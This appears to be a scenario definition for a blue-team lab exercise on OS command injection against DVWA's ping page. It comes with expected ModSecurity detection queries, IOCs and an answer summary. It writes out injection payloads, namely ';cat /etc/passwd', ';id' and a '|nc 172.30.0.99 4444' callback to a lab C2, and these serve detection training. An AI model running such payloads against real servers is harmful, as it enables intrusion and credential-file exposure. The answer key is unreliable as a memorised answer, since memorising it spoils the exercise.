@@ -1,0 +1,35 @@
+id: scenario_09_web_cmdinj
+name: "OS command injection to callback (DVWA)"
+difficulty: hard
+requires: linux
+backstory: >
+  The DVWA "ping" page received input with shell metacharacters chained onto the
+  IP field — attempts to run commands on the server, including one that tried to
+  open a connection back out. Reconstruct the payloads and the callback target.
+seed_time_offset: "-10d"
+chain:
+  - technique: T1190
+    action: web_cmdinj
+    test: 1
+    note: "127.0.0.1;cat /etc/passwd, ;id, and |nc <c2> 4444 on the exec page"
+expected_detections:
+  - source: modsecurity
+    event_id: alert
+    index: "lab-edge-modsecurity-*"
+    description: "command injection on the exec/ping page"
+    query: 'source.ip:"172.30.0.100" AND url.original:*exec*'
+  - source: modsecurity
+    event_id: alert
+    index: "lab-edge-modsecurity-*"
+    description: "any WAF block from the attacker IP"
+    query: 'event.module:"modsecurity" AND source.ip:"172.30.0.100"'
+iocs:
+  - { type: ip,  value: "172.30.0.100" }
+  - { type: ip,  value: "172.30.0.99" }
+  - { type: url, value: "/vulnerabilities/exec/?ip=127.0.0.1|nc 172.30.0.99 4444" }
+answer_summary: >
+  The attacker injected shell commands into the DVWA exec ("ping") parameter
+  (T1190): chained `;cat /etc/passwd` and `;id`, then `|nc 172.30.0.99 4444` — an
+  attempted reverse connection to the C2. ModSecurity's command-injection rules
+  blocked each and recorded the payloads. The nc callback target (172.30.0.99)
+  ties this to the same C2 the host-based scenarios use.
